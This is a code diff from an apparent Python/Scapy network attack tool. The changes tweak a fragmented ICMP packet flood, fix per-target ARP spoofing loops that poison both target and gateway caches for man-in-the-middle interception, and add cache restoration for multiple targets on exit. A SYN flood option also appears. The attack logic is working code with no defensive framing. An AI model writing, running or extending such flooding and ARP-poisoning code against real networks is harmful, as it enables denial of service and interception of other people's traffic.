@@ -50,8 +50,7 @@ def thread_delay(thread_name, delay, ip):
 	
 
 	if args.icmp:
- 		p = fragment(ip_layer/ICMP()/(args.icmp*60000))
-		send(numPackets*p)
+		send(numPackets*(fragment(ip_layer/ICMP()/(args.icmp*6000)))
 
 
 	elif args.syn:
@@ -74,14 +73,14 @@ def thread_delay(thread_name, delay, ip):
 		try:
 			while True:
 				#telling the target that we are the host
-				spoof(args.ip, args.arp, verbose)
+				spoof(ip, args.arp, verbose)
 				#telling the host that we are the target
-				spoof(args.arp, args.ip, verbose)
+				spoof(args.arp, ip, verbose)
 				time.sleep(1)
 		except KeyboardInterrupt:
 			print("[!] Detected CTRL+C ! restoring the network, please wait...")
-			restore(args.ip, args.arp)
-			restore(args.arp, args.ip)
+			restore(ip, args.arp)
+			restore(args.arp, ip)
 		
 	else:
 		print("No option selected.")
@@ -256,10 +255,13 @@ else:
 					time.sleep(0.5)
 
 			except (KeyboardInterrupt, SystemExit):
+				if args.arp:
+					print("[!] Detected CTRL+C ! restoring the network, please wait...")
+					for line in Lines:
+						restore(line.strip(), args.arp)
+						restore(args.arp, line.strip())
 				print("\n Terminating...")
 				os._exit(1)
-
-	
 		
 	else:
 		print("Defining one/multiple destination IP Addresses is mandatory.")
